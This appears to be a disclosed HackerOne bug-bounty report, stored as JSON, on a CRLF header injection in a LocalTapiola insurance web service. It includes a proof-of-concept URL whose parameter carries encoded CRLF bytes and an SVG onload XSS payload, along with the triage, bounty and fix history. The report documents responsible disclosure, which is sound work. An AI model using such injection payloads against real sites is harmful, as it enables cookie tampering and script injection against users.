{"id":121489,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE0ODk=","url":"https://hackerone.com/reports/121489","title":"CRLF injection in https://verkkopalvelu.lahitapiola.fi/","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-03-08T22:19:06.486Z","submitted_at":"2016-03-08T22:19:06.486Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"derision","url":"/derision","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/130/200df763f2337b959a1c2f28b7f74e91fd09c63e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-09-29T20:55:58.028Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-08-30T20:55:46.687Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there,\n\nThere is an HTTP header injection on https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf it allow an attacker to set custom cookies and custom content (such as XSS attack) within the response.\n\n**PoC:**\n\nThe parameter `p` is vulnerable.\n\nhttps://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf?productMode=YT\u0026locale=fi\u0026ltapp=LT_Yksityistapaturmalaskuri\u0026p=1412889500323ew2du7e081azeza%22%27%3E%3C%0D%0A+%0D%0A+%3Csvg/onload=alert%28document.domain%29%3E\u0026selectedLanguage=fi\u0026selectedArea=\n\nScreen: CRLF_poc.png\n\n\n\n","bounty_amount":"400.0","formatted_bounty":"$400","original_report_id":null,"original_report_url":null,"attachments":[{"id":77338,"file_name":"CRLF_poc.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/077/338/a9cb0bb6787a2cb0ac1059021211fd37ee91e4f2/CRLF_poc.png?response-content-disposition=attachment%3B%20filename%3D%22CRLF_poc.png%22%3B%20filename%2A%3DUTF-8%27%27CRLF_poc.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY5I5ZOTN%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133248Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQCqf43kV8RTzzmWR1TXeEdpx%2Fd5zGOFNpfZDgSM2xJuCQIhAMLYAxjZR7PGO9btJ9wGFbOqf%2FTbE2pC%2FdkQgyPDWZD8KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzmKazqBIClFAMqc2Iq1wNPV39BSW59qP%2ByHsmBjxY6m%2Fb7a6U5448PKOSe8dVf6ZB9c%2BLac%2F0Gz8ADXdDYKsvWZv%2FAmBj5%2FhHzWjVphb45t9jx%2BhpJI0AITzRmRN5aq7TLFOZDfehY6xr7qR34eKZAu9XJrbi4QdAu%2BNSUgERhmM4muMj19K4msZk8sFVbAKLF%2BU6gGnywSDktUJmbSxfnY6ZesCS5elWm1qPvYsKCbrl5y57ovXEaa7NAn6XfLDrVTRtpY8qRzPQbURfe%2FnNfBCEGQCwCuB8zQszv%2B2O4z6L6fFCLSm2gccXmLLJqlgBN7EwqRjH0XLKpn1vWKBfmNtQJMcfcBOgesSBjohFRDqs9VtzSm8Ar%2FZ3tQRyj3E5FFBVh7SFXfbH0zIPhcJnR7J%2Ft20n0T0BoFfeC4Lh04EDdGi1xF35UayBRbz0euxaVcKV0UA%2BktOyHmbRzgaonWDeZCOaJtjFZCGnWooRLI6KrYUmAIMrnyQoKS2q8DQKxvweDK7%2FuWfo1ovNRy%2BMy3v8N%2B%2B6q1M2DXNkYeXZoalrKF%2BzGC2C%2FRVd1z2LoHJiVHopIG7T4Lyax%2BX9LY1Z9oVqxPxTo9SgiI1kD69%2Bl5MKWzogETScQuH%2Bvi36SPh1QbdmYvwgw5O6QiwY6pAEabkl2EyHSmga%2FQVBclzYljmd0Pvwag9ITi%2BNlOViZyzeqV8k%2F8Q8ny0OOVtCp3iCSdWDf1LHd%2BqKtTjKS7CIODHKRsg4m3sx7QNZBHT5H00n5U2ZVgN4N9m3YxiNqVHw1I0Jv0KF1%2BS2XFhkFHuxBokXIzihowuz57pmo5yGw3bX16HVqCrlEZdpJDLSrVWPAr55aHcggcNaCjNyYlZGc9VtWCw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0643dbab0c43e1c77fc890fd4905177a1d105ba037fd1591ff63726b80660b50","file_size":129988,"type":"image/png"}],"allow_singular_disclosure_at":"2016-09-29T20:55:46.803Z","allow_singular_disclosure_after":-158776621.29486343,"singular_disclosure_allowed":true,"vote_count":11,"voters":["samux","thisishrsh","bugdiscloseguys","powerjacobb1","jens","bb00x","sumit7","spetr0x","nigba","dyabla","and 1 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":829894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please note that the `selectedArea` parameter is also vulnerable to the same attack.","automated_response":false,"created_at":"2016-03-08T22:23:56.325Z","updated_at":"2016-03-08T22:23:56.325Z","actor":{"username":"derision","cleared":false,"url":"/derision","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/130/200df763f2337b959a1c2f28b7f74e91fd09c63e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":840116,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This finding is valid. We are currently looking into the business impacts to decide on further actions.","automated_response":false,"created_at":"2016-03-15T07:10:08.149Z","updated_at":"2016-03-15T07:10:08.149Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":898056,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @derision - a short status update. We have had \"pre-h1-bugbounty\" reports on similar issues (partially same parameters) and we are looking into both upcoming fixes already in line as well as other reports - hence processing is taking a little longer than usual. ","automated_response":false,"created_at":"2016-04-10T10:14:12.282Z","updated_at":"2016-04-10T10:14:12.282Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":953002,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @derision. There are some issues in fixing this, and due to this the full fix will not be in for many months to come. For this reason, we have decided to award you with at 400$ bounty now, without closing the report. There will be no disclosure until the fix is out.","automated_response":false,"created_at":"2016-05-12T12:07:01.968Z","updated_at":"2016-05-12T12:07:01.968Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"derision","url":"/derision"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":953018,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree on this, thank you.","automated_response":false,"created_at":"2016-05-12T12:14:32.859Z","updated_at":"2016-05-12T12:14:32.859Z","actor":{"username":"derision","cleared":false,"url":"/derision","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/130/200df763f2337b959a1c2f28b7f74e91fd09c63e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":953025,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your effort and understanding.","automated_response":false,"created_at":"2016-05-12T12:17:19.271Z","updated_at":"2016-05-12T12:17:19.271Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163006,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, could you please verify that this is now fully fixed from your point of view. If yes, then we will go ahead and close this one.","automated_response":false,"created_at":"2016-08-30T18:37:59.401Z","updated_at":"2016-08-30T18:37:59.401Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @localtapiola-thomas, this issue seems to be fully fixed for me.","automated_response":false,"created_at":"2016-08-30T19:06:27.862Z","updated_at":"2016-08-30T19:06:27.862Z","actor":{"username":"derision","cleared":false,"url":"/derision","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/130/200df763f2337b959a1c2f28b7f74e91fd09c63e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1163363,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for your efforts, we will close the report now.","automated_response":false,"created_at":"2016-08-30T20:55:00.625Z","updated_at":"2016-08-30T20:55:00.625Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"derision","url":"/derision"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163367,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting full disclosure.","automated_response":false,"created_at":"2016-08-30T20:55:46.717Z","updated_at":"2016-08-30T20:55:46.717Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224577,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-29T20:55:58.108Z","updated_at":"2016-09-29T20:55:58.108Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2486,"category":"team","content":"##Issue\n\nThe reporter was able to inject http-headers to set custom cookies and custom content (such as as XSS attack) within the response.  The report contained a thorough PoC and appropriate screenshots which assisted the triaging process.\n\n##Fix\n\nThe issue was investigated and found to be valid. The final fix was partly dependent on other fixes.\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. There were some cross-dependencies with other fixes which led to a postponed disclosure.\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}